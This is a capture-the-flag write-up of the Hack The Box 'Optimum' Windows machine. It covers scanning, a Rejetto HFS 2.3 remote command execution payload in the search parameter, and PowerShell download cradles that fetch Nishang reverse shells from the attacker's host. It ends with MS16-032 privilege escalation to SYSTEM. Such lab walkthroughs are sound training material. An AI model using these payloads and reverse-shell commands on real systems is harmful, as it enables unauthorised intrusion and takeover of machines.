---
layout: default
title: Optimum
parent: Hack The Box - Windows
nav_order: 2
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/HTB/optimum]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 10.129.161.181
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-13 22:53 EST
Nmap scan report for 10.129.161.181
Host is up (0.13s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.19 seconds


```

# Enumeration

---

## HTTP | 80

This is the HFS 2.3 Rejetto File Server

![rejetto](../../../assets/images/ctfs/hack_the_box/optimum/rejetto.png)

```bash
┌──(vagrant㉿kali)-[~/Documents/HTB/legacy]
└─$ searchsploit rejetto
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities     | windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload        | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)   | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)   | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execut | windows/webapps/34852.txt
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)           | windows/webapps/49125.py
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

Exploit 49125 provides a POC demonstrating that a specially crafted HTTP request will allow RCE.

Let's demonstrate this works by sending a PING request.

```bash
http://10.129.161.181/?search=%00{.+exec|cmd.exe+/c+ping+/n+1+10.10.14.9.}

# URL Encode

http://10.129.161.181/?search%3D%2500%7B.%2Bexec%7Ccmd.exe%2B%2Fc%2Bping%2B%2Fn%2B1%2B10.10.14.9.%7D

# Executing with Curl results in our attack box being pinged by the target
┌──(vagrant㉿kali)-[~/Documents/HTB/legacy]
└─$ curl http://10.129.161.181/?search%3D%2500%7B.%2Bexec%7Ccmd.exe%2B%2Fc%2Bping%2B%2Fn%2B1%2B10.10.14.

┌──(vagrant㉿kali)-[~/Documents/HTB]
└─$ sudo tcpdump -i tun0                                                                                tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes                                 23:14:47.318743 IP 10.10.14.19.37550 > 10.129.161.181.http: Flags [S], seq 3434129733, win 64240, option
s [mss 1460,sackOK,TS val 609468177 ecr 0,nop,wscale 7], length 0
23:14:47.448205 IP 10.129.161.181.http > 10.10.14.19.37550: Flags [S.], seq 3083914868, ack 3434129734,
win 8192, options [mss 1340,nop,wscale 8,sackOK,TS val 380577 ecr 609468177], length 0
23:14:47.448478 IP 10.10.14.19.37550 > 10.129.161.181.http: Flags [.], ack 1, win 502, options [nop,nop,
TS val 609468306 ecr 380577], length 0

```

We can also execute in the browser.

![ping](../../../assets/images/ctfs/hack_the_box/optimum/ping.png)

```bash
┌──(vagrant㉿kali)-[~/Documents/HTB]                                                                    └─$ sudo tcpdump -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode                               listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:08:23.984420 IP 10.10.14.19.52494 > 10.129.161.181.http: Flags [S], seq 3250616747, win 64240, options [mss 1460,sackOK,TS val 609084842 ecr 0,nop,wscale 7], length 0
23:08:24.110937 IP 10.129.161.181.http > 10.10.14.19.52494: Flags [S.], seq 2249203822, ack 3250616748, win 8192, options [mss 1340,nop,wscale 8,sackOK,TS val 342246 ecr 609084842], length 0
23:08:24.110997 IP 10.10.14.19.52494 > 10.129.161.181.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 609084969 ecr 342246], length 0
```

# Exploitation

---

We can use Nishang to get a reverse shell.

We will make sure to use the Powershell path _C:\Windows\SysNative\WindowsPoershell\v1.0\powershell.exe_ in order to get a 64-bit shell.

This chart shows how to get a 32-bit session to provide a 64-bit shell.

![architecture](../../../assets/images/ctfs/hack_the_box/optimum/architecture.png)

```bash
# Copy the reverse shell script to our current directory
┌──(vagrant㉿kali)-[/opt/tools/nishang/Shells]
└─$ sudo cp Invoke-PowerShellTcp.ps1 /home/vagrant/Documents/HTB/optimum/

# rename to rev.ps1
┌──(vagrant㉿kali)-[~/Documents/HTB/optimum]
└─$ mv Invoke-PowerShellTcp.ps1 rev.ps1

# Edit the Nishang reverse shell script
┌──(vagrant㉿kali)-[~/Documents/HTB/optimum]
└─$ sudo echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.19 -Port 9001" >> rev.ps1

# Here is the payload to get the rev.ps1 payload downloaded
http://10.129.161.181/?search=%00{.exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).downloadString('http://10.10.14.19:8000/rev.ps1').}

# Use curl to execute the URL encoded version

curl http://10.129.161.181/?search=%00%7B.exec%7Cc%3A%5CWindows%5CSysNative%5CWindowsPowershell%5Cv1.0%5Cpowershell.exe%20IEX%20%28New-Object%20Net.WebClient%29.downloadString%28%27http%3A%2F%2F10.10.14.19%3A8000%2Frev.ps1%27%29.%7D

```

![reverse](../../../assets/images/ctfs/hack_the_box/optimum/reverse.png)

# Post-Exploitation

---

We can see that we have a 64-bit shell

```bash
┌──(vagrant㉿kali)-[~/Documents/HTB/optimum]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.19] from (UNKNOWN) [10.129.161.181] 49190
Windows PowerShell running as user kostas on OPTIMUM
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\kostas\Desktop>whoami
optimum\kostas
PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess
True

```

## Run Watson/Sherlock to Locate Vulnerabilities

This is an old box and Watson is not working, so tried Sherlock.

https://github.com/rasta-mouse/Sherlock.git

Place "Find-AllVulns" at the bottom of the script.

```bash
PS C:\Users\kostas\Desktop>IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.19:8000/Sherloc
k.ps1')



Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Appears Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
             tml
VulnStatus : Not Vulnerable

```

MS16-032, MS16-034, and MS16-135 are the vulns that have a VulnStatus of "Appears Vulnerable"

## Exploit MS16-032

Get MS16-032 exploit from Empire Project

https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1

Edit the script and add the following at the bottom of the script.

```bash
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.19:8000/rev2.ps1')"

```

Copy rev.ps1 used earlier and increment the port at the bottom of the script and name rev2.ps1.

Now we just upload the MS16-032 script using the existing PowerShell cradel and get a reverse shell on our netcat listener.

```bash
IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.19:8000/ms16-032.ps1')
```

![system](../../../assets/images/ctfs/hack_the_box/optimum/system.png)
